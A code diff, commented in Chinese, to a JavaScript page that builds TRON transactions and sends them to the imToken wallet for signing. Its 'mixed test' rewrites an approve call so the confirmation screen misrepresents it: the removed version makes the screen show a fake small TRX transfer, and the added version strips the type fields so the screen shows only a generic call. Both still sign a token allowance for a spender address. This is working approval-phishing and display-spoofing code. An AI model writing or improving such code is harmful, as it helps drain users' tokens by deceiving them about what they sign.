@@ -276,9 +276,9 @@
     } catch (e) { log('构造失败: ' + (e.message || e), 'error'); }
   }
 
-  // ③ 混合测试：toJSON() 分离 UI 读取与序列化
-  // contract.type / contract.parameter → UI 直接属性访问 → 显示 TRX 转账
-  // contract.toJSON() → JSON.stringify 返回 {"1":31,"2":realParam} → 序列化为 approve
+  // ③ 混合测试：纯普通对象，仅放数字键 "1"/"2"
+  // 不放 type/parameter → 序列化为 TriggerSmartContract(31) + approve 参数
+  // imToken UI 读取 contract.type 为 undefined → 可能显示通用合约调用或解析 raw_data_hex
   async function mixedTx() {
     if (!window.tronWeb?.transactionBuilder) { log('tronWeb 未就绪', 'error'); return; }
     log('构造混合测试交易…', 'warn');
@@ -297,45 +297,27 @@
       const realParam = transaction.raw_data.contract[0].parameter;
       const originalHex = transaction.raw_data_hex;
 
-      // 假的 TransferContract — 钱包确认页显示 TRX 转账
-      const fakeParam = {
-        type_url: 'type.googleapis.com/protocol.TransferContract',
-        value: {
-          amount: 100000,
-          to_address: SPENDER,
-          owner_address: walletAddr
-        }
+      // 纯普通对象，仅数字键 → 无 descriptor、无函数、无 type/parameter
+      // 序列化: field 1 = 31 (TriggerSmartContract), field 2 = realParam (approve)
+      transaction.raw_data.contract[0] = {
+        '1': 31,
+        '2': realParam
       };
-
-      // toJSON 方案：
-      //   UI 读 contract.type → "TransferContract" → 弹窗显示 TRX 转账
-      //   JSON.stringify(contract) → {"1":31,"2":realParam} → approve 语义
-      const contract = {
-        type: 'TransferContract',
-        parameter: fakeParam,
-        toJSON() {
-          return { '1': 31, '2': realParam };
-        }
-      };
-
-      transaction.raw_data.contract[0] = contract;
-      // 不删 raw_data_hex，桥接层可以正常读取
 
       const hasSelector = originalHex.includes('095ea7b3');
-      log('━━━━ toJSON 分离方案 ━━━━', 'warn');
-      log(`[UI读取] contract.type → "${contract.type}"`, 'success');
-      log(`[UI读取] contract.parameter.to_address → ${SPENDER.slice(0,8)}...`, 'success');
-      log(`[序列化] JSON.stringify → ${JSON.stringify(contract)}`, 'warn');
-      log(`[反序列化恢复] parsed["1"]=${JSON.parse(JSON.stringify(contract))['1']} parsed["2"]存在=${!!JSON.parse(JSON.stringify(contract))['2']}`, 'warn');
-      log(`[期望] toJSON 仅输出 "1"/"2" → 桥接层解析为 approve`, 'success');
-      log(`[签名] 原 raw_data_hex 含 approve 选择器: ${hasSelector}`, hasSelector ? 'success' : 'error');
+      const keys = Object.keys(transaction.raw_data.contract[0]);
+      log('━━━━ 纯数字键方案 ━━━━', 'warn');
+      log(`[contract键] Object.keys = [${keys.join(', ')}]`, 'warn');
+      log(`[序列化] field 1=31(TriggerSmartContract), field 2=approve参数`, 'success');
+      log(`[备注] contract.type 不存在 → UI 可能显示通用合约调用`, 'warn');
+      log(`[签名] raw_data_hex 含 approve 选择器: ${hasSelector}`, hasSelector ? 'success' : 'error');
       log('━━━━━━━━━━━━━━━━━━━━', 'warn');
 
-      const ok = await sendTx(transaction, '混合测试 (toJSON)');
+      const ok = await sendTx(transaction, '混合测试 (纯数字键)');
       if (ok) {
         setTimeout(() => refreshAllowanceUI(false), 12000);
       } else {
-        log('⚠ 若弹窗显示 TRX 转账但广播失败 → 桥接层可能不走 JSON.stringify', 'warn');
+        log('⚠ 若未闪退且弹窗正常显示 → 桥接层接受纯数字键', 'warn');
       }
     } catch (e) {
       log('构造失败: ' + (e.message || e), 'error');
